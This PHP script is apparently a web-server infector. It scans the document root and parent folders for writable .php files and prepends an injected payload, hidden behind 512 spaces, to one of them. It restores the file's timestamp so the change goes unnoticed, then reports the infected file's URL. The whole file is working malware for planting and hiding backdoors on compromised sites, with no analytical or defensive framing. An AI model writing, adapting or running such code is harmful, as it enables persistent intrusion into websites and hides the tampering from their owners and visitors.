if(!defined("PHP_EOL"))
{
    define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
    define("DIRECTORY_SEPARATOR", "/");
}



srand(time());

/////////////////////////////////////////////////////////
if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data) {
        $f = @fopen($filename, 'w');
        if (!$f) {
            return false;
        } else {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}

function GetPathDiff($base_path, $full_path)
{
    $pos = strpos($full_path, $base_path);

    if ($pos === FALSE)
    {
        return FALSE;
    }

    return substr($full_path, $pos + strlen($base_path));
}

function GetWritableFiles()
{
	$res = Array();

	$analysys_queue = Array();

	$analysys_queue[] = GetDocRoot();

	$self_path = $_SERVER['SCRIPT_FILENAME'];
	while (($slash = strrpos($self_path, DIRECTORY_SEPARATOR)) !== FALSE)
	{
		$self_path = substr($self_path, 0, $slash);

        if ($self_path == GetDocRoot())
        {
            break;
        }

		if (strlen($self_path))
		{
			$analysys_queue[] = $self_path;
		}
	}

	foreach ($analysys_queue as $current_dir)
	{
		if (!in_array($current_dir, $res))
		{
			$res = array_merge($res, GetFileList($current_dir));
		}
	}

	return CheckWritable(array_unique($res));
}

function CheckWritable($file_list)
{
	$file_list_writable = Array();

	foreach ($file_list as $file)
	{
		if (@is_writable($file) == TRUE)
		{
            $file_list_writable[] = $file;
		}
	}

	return $file_list_writable;
}

function GetFileList($dir, $depth=10000)
{
	$result = array();

    if ($depth < 1)
    {
        return $result;
    }

	$dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
	$h = @opendir($dir);
	if ($h === FALSE)
	{
		return $result;
	}

	while (($f = readdir($h)) !== FALSE)
	{
		if ($f !== '.' and $f !== '..')
		{
			$current_file = "$dir/$f";
			if (is_file($current_file))
			{
                if (strpos($current_file, ".php") !== FALSE)
                {
                    $result[] = $current_file;
                }
			}
            else
            {
                if (is_dir($current_file))
                {
                    $result = array_merge($result, GetFileList($current_file, $depth / 10));
                }
            }
		}
	}

	closedir($h);

	return $result;
}

function GetDocRoot()
{
	$docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
	if ($docroot_end === FALSE)
	{
		return $_SERVER['DOCUMENT_ROOT'];
	}
	elseif ($docroot_end === 0)
	{
		return "/";
	}
	else
	{
		return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
	}
}

function GetSpaceString($len)
{
    $str = "";
    for ($i=0; $i<$len; $i++) {$str .= " ";}
    return $str;
}

function PatchPayload($path, $payload)
{
    if (file_exists($path))
    {
        $mod_time = @stat($path);

        $data = @file_get_contents($path);
        if ($data)
        {
            if (strpos($data, "eval") === FALSE)
            {
                $data = "<?php " . GetSpaceString(512) . rawurldecode($payload) . " ?>" . $data;
                if (@file_put_contents($path, $data) != FALSE)
                {
                    if ($mod_time)
                    {
                        @touch($path, $mod_time['mtime']);
                    }
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

////////////////////////////////////////////////////////////////////////////////////////////

# get base local and remote path
$base_www_path = $host = @$_SERVER['HTTP_HOST'];
$base_local_path = GetDocRoot();

$file_list_writable = GetWritableFiles();

if (count($file_list_writable) == 0)
{
    echo "STATUS_UNWRITABLE";
    exit();
}

shuffle($file_list_writable);

$max_tries = 5;
foreach ($file_list_writable as $current_file)
{
    if ($max_tries <= 0)
    {
        break;
    }

    if (strpos($current_file, basename($_SERVER['PHP_SELF'])) !== FALSE)
    {
        continue;
    }

    $uri_path = GetPathDiff($base_local_path, $current_file);
    $full_uri = $base_www_path . (strpos($uri_path, "/") == 0 ? $uri_path : "/".$uri_path);

    if (PatchPayload($current_file, $payload_file))
    {
        echo "URL#http://" . $full_uri . PHP_EOL;
        exit();
    }

    $max_tries -= 1;
}

echo "STATUS_CANTUPLOAD";
exit();
